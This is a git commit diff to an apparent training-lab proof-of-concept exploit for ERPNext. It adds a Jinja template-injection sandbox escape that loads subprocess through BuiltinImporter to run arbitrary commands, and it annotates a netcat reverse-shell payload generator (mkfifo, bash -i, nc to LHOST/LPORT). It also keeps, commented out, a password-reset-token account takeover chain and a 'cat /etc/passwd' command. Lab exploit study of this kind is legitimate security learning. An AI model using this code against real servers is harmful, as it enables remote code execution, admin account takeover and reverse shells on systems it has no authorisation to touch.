71117bfb6cb3abfbd1550e12335d1177eff30e60
dvdg6566 <czhdaniel@gmail.com>
2024-05-21 23:11:49 +0800

    Finished extra mile and exercise with builtin import

--- labs/erpnext/poc.py
+++ labs/erpnext/poc.py
@@ -240,6 +240,7 @@ def get_output(ip, session, admin_email, template_name, template):
 	
 	return r.text
 
+# Generates base64 nc reverse shell payload
 def generate_shellcode(LHOST, LPORT):
 	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
 	encoded = base64.b64encode(command.encode())
@@ -259,8 +260,6 @@ def get_shell(ip, session, admin_email, template_name):
 	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
 	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
 	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
-	# "{% set subprocess = subclasses[391] %}"
-	# "{% set shellcode = \"echo " + shellcode + " = | base64 -d  | sh\" %}"
 	"{{subclasses}}")
 
 	output = get_output(ip, session, admin_email, template_name, template)
@@ -307,6 +306,51 @@ def execute_command(ip, session, admin_email, template_name, command):
 		print("RCE has failed")
 		exit(0)
 
+# Extra Mile 8.6.2.2
+def run_command_2(ip, session, admin_email, template_name, command):
+	template = ("{% set string = \"test\" %}"
+	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
+	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
+	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
+	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
+	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
+	"{{subclasses}}"
+	)
+
+	print()
+	print(f"Run command: {command}")
+	
+	output = get_output(ip, session, admin_email, template_name, template)
+	resp = json.loads(output)["message"]["message"]
+	resp = resp[5:-6] # Remove <div></div> tag
+
+	# Match away <class XXX > tags
+	subclasses = re.findall('<class \'(.*?)\'>,', output)
+	builtin_index = subclasses.index("_frozen_importlib.BuiltinImporter")
+	print("Subclass index: ", builtin_index)
+	
+	template = ("{% set string = \"test\" %}"
+	"{% set class_template = \"\\x5f\\x5fclass\\x5f\\x5f\" %}"
+	"{% set mro_template = \"\\x5f\\x5fmro\\x5f\\x5f\" %}"
+	"{% set subclasses_template = \"\\x5f\\x5fsubclasses\\x5f\\x5f\" %}"
+	"{% set mro = string|attr(class_template)|attr(mro_template) %}"
+	"{% set subclasses = mro[1]|attr(subclasses_template)() %}"
+	f"{{% set builtins = subclasses[{builtin_index}]%}}"
+	"{% set subprocess = builtins|attr(\"load_module\")(\"subprocess\") %}"
+	f"{{{{subprocess.run(\"{command}\", shell=True, stdout=subprocess.PIPE).stdout}}}}"
+	)
+
+	output = get_output(ip, session, admin_email, template_name, template)
+	print(output)
+
+	return ""
+	try:
+		return json.loads(output)["message"]["message"][5:-6]
+	except Exception as e:
+		print(e)
+		print("RCE has failed")
+		exit(0)
+
 
 def main():
 	if len(sys.argv) != 2:
@@ -322,16 +366,16 @@ def main():
 	admin_email = get_admin_user_email(ip)
 	print(f"Admin email {admin_email} found!")
 
-	print("Sending password reset......")
-	send_reset_password(ip, admin_email)
+	# print("Sending password reset......")
+	# send_reset_password(ip, admin_email)
 
-	print("Searching for password reset token")
-	token = get_password_reset_token(ip, admin_email)
-	print(f"Sucessfully got reset token {token}")
+	# print("Searching for password reset token")
+	# token = get_password_reset_token(ip, admin_email)
+	# print(f"Sucessfully got reset token {token}")
 
-	print("Restting password")
-	reset_password(ip, admin_email, token, new_password)
-	print("Password reset succesfully!")
+	# print("Restting password")
+	# reset_password(ip, admin_email, token, new_password)
+	# print("Password reset succesfully!")
 
 	print("Logging in now")
 	session = login(ip, admin_email, new_password)
@@ -342,12 +386,15 @@ def main():
 	# Gets a reverse shell on port 9001
 	#get_shell(ip, session, admin_email, template_name)
 	
-	# Runs arbitrary command
-	cmd = "cat /etc/passwd"
-	output = execute_command(ip, session, admin_email, template_name, cmd)
+	# Runs arbitrary command (using sys intermediary)
+	# cmd = "cat /etc/passwd"
+	# output = execute_command(ip, session, admin_email, template_name, cmd)
+	# print(output)
+
+	# Arbitrary file run (using builtin functions)
+	cmd = "whoami"
+	output = run_command_2(ip, session, admin_email, template_name, cmd)
 	print(output)
-
-
 
 if __name__ == '__main__':
 	main()
